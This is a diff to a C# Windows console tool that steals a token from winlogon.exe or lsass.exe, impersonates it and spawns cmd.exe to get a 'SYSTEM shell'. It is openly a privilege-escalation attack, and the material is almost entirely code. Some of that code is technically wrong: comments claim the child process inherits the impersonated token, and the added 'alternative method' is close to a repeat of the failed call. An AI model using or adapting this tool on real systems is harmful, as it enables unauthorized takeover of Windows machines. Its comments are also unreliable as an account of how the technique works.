@@ -97,7 +97,7 @@ internal static class Program
 
     private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
     private const uint PROCESS_DUP_HANDLE = 0x0040;
-    private const uint PROCESS_ALL_ACCESS = 0x1FFFFF;
+    private const uint PROCESS_CREATE_PROCESS = 0x0080;
 
     private const uint TOKEN_QUERY = 0x0008;
     private const uint TOKEN_DUPLICATE = 0x0002;
@@ -190,6 +190,12 @@ internal static class Program
     [DllImport("advapi32.dll", SetLastError = true)]
     static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass,
         IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, IntPtr lpPipeAttributes, uint nSize);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);
 
     #endregion
 
@@ -646,7 +652,7 @@ internal static class Program
 
     #endregion
 
-    #region Main - Funktionierende SYSTEM Shell (Einfache Methode)
+    #region Main - Working Version ohne SeAssignPrimaryTokenPrivilege
 
     public static void Main()
     {
@@ -692,7 +698,7 @@ internal static class Program
         }
 
         // ===============================================
-        // WinLogon Token
+        // WinLogon Token - Alternative Methode
         // ===============================================
 
         Console.WriteLine("[*] Looking for winlogon.exe...");
@@ -701,21 +707,28 @@ internal static class Program
         if (winlogonPid == 0)
         {
             Console.WriteLine("[-] Could not find winlogon.exe!");
-            Console.ReadKey();
-            return;
+            Console.WriteLine("[*] Trying lsass.exe instead...");
+            winlogonPid = FindTargetPid("lsass");
+
+            if (winlogonPid == 0)
+            {
+                Console.WriteLine("[-] Could not find any suitable process!");
+                Console.ReadKey();
+                return;
+            }
         }
 
-        Console.WriteLine($"[+] Found winlogon.exe with PID: {winlogonPid}");
+        Console.WriteLine($"[+] Found target with PID: {winlogonPid}");
 
         try
         {
-            // WinLogon Prozess öffnen
-            IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, winlogonPid);
+            // Prozess mit PROCESS_CREATE_PROCESS Zugriff öffnen
+            IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE, false, winlogonPid);
 
             if (hProcess == IntPtr.Zero)
             {
                 int error = Marshal.GetLastWin32Error();
-                Console.WriteLine($"[-] Could not open winlogon.exe: {error} (0x{error:X8})");
+                Console.WriteLine($"[-] Could not open process: {error} (0x{error:X8})");
                 Console.ReadKey();
                 return;
             }
@@ -768,8 +781,8 @@ internal static class Program
             Console.WriteLine("[+] Impersonation token created");
             CloseHandle(hToken);
 
-            // Jetzt die eigentliche Impersonation
-            Console.WriteLine("[*] Impersonating winlogon...");
+            // Impersonate den aktuellen Thread
+            Console.WriteLine("[*] Impersonating target...");
 
             if (!ImpersonateLoggedOnUser(hImpersonationToken))
             {
@@ -781,10 +794,11 @@ internal static class Program
             }
 
             Console.WriteLine("[+] Impersonation successful!");
-            Console.WriteLine("[*] Current thread is now running as SYSTEM");
+            Console.WriteLine("[*] Current thread now runs as the target user");
             Console.WriteLine("[*] Starting SYSTEM shell...");
 
-            // Jetzt einen neuen Prozess starten - er erbt automatisch den impersonierten Token!
+            // Jetzt einen neuen Prozess im Kontext des impersonierten Threads starten
+            // Verwende CreateProcess mit dem impersonierten Token
             STARTUPINFO si = new STARTUPINFO();
             si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
             si.dwFlags = STARTF_USESHOWWINDOW;
@@ -792,12 +806,14 @@ internal static class Program
 
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
+            // Wichtig: Verwende den aktuellen Prozess als Parent
+            // Das neue Process erbt den impersonierten Token
             bool processStarted = CreateProcess(
                 null,
                 "cmd.exe",
                 IntPtr.Zero,
                 IntPtr.Zero,
-                false,
+                true,  // Handle vererben
                 CREATE_NEW_CONSOLE,
                 IntPtr.Zero,
                 null,
@@ -810,11 +826,11 @@ internal static class Program
                 Console.WriteLine();
                 Console.WriteLine("[+] ===============================================");
                 Console.WriteLine("[+] !!! SUCCESS !!!");
-                Console.WriteLine("[+] A new cmd.exe is running with SYSTEM privileges!");
+                Console.WriteLine("[+] A new cmd.exe is running with elevated privileges!");
                 Console.WriteLine("[+] ===============================================");
                 Console.WriteLine();
                 Console.WriteLine("[*] In the new cmd.exe window, type: whoami");
-                Console.WriteLine("[*] Expected output: nt authority\\system");
+                Console.WriteLine("[*] Also try: whoami /groups | findstr S-1-16");
 
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
@@ -823,6 +839,33 @@ internal static class Program
             {
                 int error = Marshal.GetLastWin32Error();
                 Console.WriteLine($"[-] CreateProcess failed: {error} (0x{error:X8})");
+
+                if (error == 5)
+                {
+                    Console.WriteLine();
+                    Console.WriteLine("[!] Access Denied. Trying alternative method...");
+
+                    // Alternative: Neue Konsolen-Session
+                    processStarted = CreateProcess(
+                        null,
+                        "cmd.exe",
+                        IntPtr.Zero,
+                        IntPtr.Zero,
+                        false,
+                        CREATE_NEW_CONSOLE,
+                        IntPtr.Zero,
+                        Environment.GetEnvironmentVariable("SystemRoot") + "\\System32",
+                        ref si,
+                        out pi);
+
+                    if (processStarted)
+                    {
+                        Console.WriteLine($"[+] cmd.exe started with PID: {pi.dwProcessId}");
+                        Console.WriteLine("[+] !!! SUCCESS !!!");
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(pi.hThread);
+                    }
+                }
             }
 
             // Aufräumen
